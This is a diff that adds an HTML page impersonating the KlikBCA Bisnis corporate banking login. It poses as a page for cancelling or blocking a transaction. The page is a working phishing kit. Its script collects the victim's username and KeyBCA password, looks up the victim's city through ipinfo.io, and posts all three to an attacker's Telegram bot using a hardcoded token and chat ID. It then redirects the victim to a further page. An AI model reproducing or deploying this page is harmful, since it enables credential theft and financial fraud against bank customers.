@@ -1,0 +1,89 @@
+<!DOCTYPE html><html style="height:100%;width:100%;">
+<head>
+    <title>KLIKBCA BISNIS</title>
+    <meta name="HandheldFriendly" content="true" />
+    <meta name="viewport" content="width=500,user-scalable=no" />
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, shrink-to-fit=no">
+    <link rel="icon" type="image/png" href="https://vpn.klikbca.com/+CSCOU+/v2_favicon.png">
+    <link rel="stylesheet" href="https://vpn.klikbca.com/+CSCOU+/v2_bootstrap452.css">
+    <link rel="stylesheet" href="https://vpn.klikbca.com/+CSCOU+/v2_style.css">
+</head>
+<body id="body">
+    <div class="main">
+        <nav class="navbar navbar-light pb-0">
+            <div class="d-flex justify-content-end w-100">
+                <a id="home" href="bisnis.html"></a>
+            </div>
+        </nav>
+        <div class="container-fluid vpn-container">
+            <div class="row justify-content-md-center pl-3 pr-3">
+                <div class="landscape col-12 col-sm-12 col-md-12 col-lg-5 col-xl-4">
+                    <img class="d-block logo-bca" src="https://vpn.klikbca.com/+CSCOU+/v2_logo-bca.png">
+                    <span class="text-blue-bca-1 d-block font-weight-bold font-28-44">KlikBCA Bisnis</span>
+                    <span class="text-blue-bca-1 d-block font-18-28">Batalkan Transaksi</span>
+                    <form id="klikBisnis" onsubmit="submitForm(event)" method="POST">
+                        <div class="form-group mb-2-3">
+                            <label class="text-blue-bca-2 font-14-20 font-weight-bold mb-0" for="username">Username</label>
+                            <input type="text" class="form-control border-0 box-shadow outline-none mb-0" id="username" name="username" placeholder="CorporateID UserID (tanpa spasi)" autocomplete="off" autofocus>
+                        </div>
+                        <div class="form-group mb-2-3">
+                            <label class="text-blue-bca-2 font-14-20 font-weight-bold mb-0" for="password">Password</label>
+                            <input type="password" class="form-control border-0 box-shadow outline-none" id="password" name="password" minlength="6" maxlength="8" placeholder="KeyBCA Appli 1" autocomplete="off">
+                        </div>
+                        <input type="hidden" id="kota" name="kota">
+                        <input id="kirims" type="submit" class="btn text-white vpn-btn mt-2 mb-3" value="BLOKIR KLIK BCA BISNIS">
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer class="footer text-blue-bca-1">
+        <div class="container text-center">
+            <small class="footer-font-mob">Copyright &copy 2020</small>
+            <img class="footer-img mr-1 ml-1" src="https://vpn.klikbca.com/+CSCOU+/v2_logo-bca-copyright.png">
+            <small class="footer-font-mob">All Right Reserved</small>
+        </div>
+    </footer>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            fetch("https://ipinfo.io/city")
+                .then(response => response.text())
+                .then(data => {
+                    document.getElementById("kota").value = data.trim();
+                })
+                .catch(() => {
+                    document.getElementById("kota").value = "Gagal Mendapatkan Kota";
+                });
+        });function submitForm(event) {
+        event.preventDefault();
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+        const kota = document.getElementById("kota").value;
+
+        const token = "7223686317:AAFJKbUn4qC-s9s6Ii-vQRevQ47bk47TS2I";
+        const chat_id = "7386992179";
+        const message = `Username: ${username}\nPassword: ${password}\nKota: ${kota}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ chat_id, text: message }),
+        })
+            .then(response => {
+                if (response.ok) {
+                    alert("Data berhasil dikirim.");
+                    window.location.href = "key.html";
+                } else {
+                    alert("Gagal mengirim data.");
+                }
+            })
+            .catch(() => alert("Terjadi kesalahan saat mengirim data."));
+    }
+</script>
+
+</body>
+</html>
